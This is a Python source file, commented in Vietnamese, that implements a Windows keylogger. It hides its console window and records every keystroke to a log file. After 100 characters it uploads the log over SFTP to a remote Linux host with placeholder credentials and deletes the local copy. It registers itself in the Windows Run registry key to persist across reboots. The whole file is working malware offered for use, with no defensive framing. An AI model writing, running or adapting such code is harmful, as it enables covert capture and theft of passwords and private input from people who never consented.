import win32api
import win32console
import win32gui
import pythoncom
import pyHook
import paramiko
import os
import winreg as reg

# Ẩn cửa sổ console
win = win32console.GetConsoleWindow()
win32gui.ShowWindow(win, 0)

log_file = 'C:\\path_to_save_log\\log.txt'  # Đường dẫn đến file log trên máy Windows

# Hàm xử lý sự kiện bàn phím
def OnKeyboardEvent(event):
    with open(log_file, 'a') as f:
        f.write(chr(event.Ascii))
    return True

# Đăng ký hàm xử lý với HookManager
hm = pyHook.HookManager()
hm.KeyDown = OnKeyboardEvent
hm.HookKeyboard()

def send_file_to_linux(local_file_path, remote_file_path, linux_ip, linux_username, linux_password):
    try:
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh.connect(linux_ip, username=linux_username, password=linux_password)

        sftp = ssh.open_sftp()
        sftp.put(local_file_path, remote_file_path)
        sftp.close()
        ssh.close()

        # Xóa file log sau khi chuyển
        os.remove(local_file_path)
    except Exception as e:
        print(f"Error occurred: {e}")

# Gửi file log mỗi lần sau khi viết đủ 100 ký tự
def check_and_send_log():
    if os.path.exists(log_file) and os.path.getsize(log_file) >= 100:
        send_file_to_linux(log_file, '/home/user/log.txt', '192.168.x.x', 'your_linux_username', 'your_linux_password')

# Thêm chương trình vào startup thông qua Registry
def add_to_startup(script_path):
    key = reg.HKEY_CURRENT_USER
    key_value = r"Software\Microsoft\Windows\CurrentVersion\Run"

    # Mở khóa Run, nếu không tồn tại thì tạo mới
    try:
        open_key = reg.OpenKey(key, key_value, 0, reg.KEY_ALL_ACCESS)
    except FileNotFoundError:
        # Tạo thư mục nếu nó không tồn tại
        open_key = reg.CreateKey(key, key_value)

    # Thêm giá trị mới
    reg.SetValueEx(open_key, "MyKeylogger", 0, reg.REG_SZ, script_path)
    reg.CloseKey(open_key)


if __name__ == '__main__':
    # Thiết lập để chương trình tự động chạy khi khởi động
    script_path = os.path.realpath(__file__)
    add_to_startup(script_path)

    # Chạy keylogger
    while True:
        pythoncom.PumpWaitingMessages()
        check_and_send_log()
